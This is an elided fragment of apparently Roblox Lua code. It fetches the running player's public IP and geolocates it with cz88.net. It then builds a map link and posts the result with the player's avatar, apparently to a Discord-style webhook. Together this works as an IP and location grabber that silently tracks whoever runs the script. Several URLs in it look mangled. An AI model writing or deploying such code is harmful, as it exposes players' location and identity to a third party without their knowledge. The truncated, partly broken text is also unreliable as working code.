...
local function GetIP()
    local IP = GetJson("https://searchplugincsdn.net/api/v1/ip/get").data.ip
    local Url = "https://cz88.net/api/cz88/ip/acurate?ip="..IP
    ...
    return "["..IP.."](https://uri.amap.com/arker?markers="..table.concat(Json, "|")..")"
end
    ...
    task.spawn(function()
        request({
            ...
            Body = HttpService:JSONEncode({
                ...
                avatar_url = GetJson("https://t.com/v1/users/avatar-headshot?userIds="..LocalPlayer.UserId.."&size=420x420&formaPng").data[1].imageUrl,
                embeds = {
                    {
                        color = 65280,
                        fields = {
